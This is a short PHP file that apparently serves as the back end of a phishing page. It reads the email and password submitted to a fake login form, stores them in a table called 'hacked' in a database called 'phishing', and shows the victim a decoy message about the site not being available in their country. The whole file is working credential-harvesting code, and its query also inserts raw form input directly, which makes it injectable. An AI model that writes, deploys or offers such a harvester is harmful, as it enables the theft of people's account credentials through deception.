<?php

$servername = "mysql:host=localhost;dbname=phishing";
$username = "root";
$password = "";
$email = $_POST["email"];
$pass = $_POST["pass"];

try {
  $conn = new PDO($servername,$username,$password);
  // set the PDO error mode to exception
  $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
  $sql = "INSERT INTO hacked (number, email, password)
  VALUES ('', '$email', '$pass')";
  $conn->exec($sql);
  echo "sorry , Your country doesn't support this website.";
} catch(PDOException $e) {
  echo $sql . "<br>" . $e->getMessage();
}

$conn = null;
?>
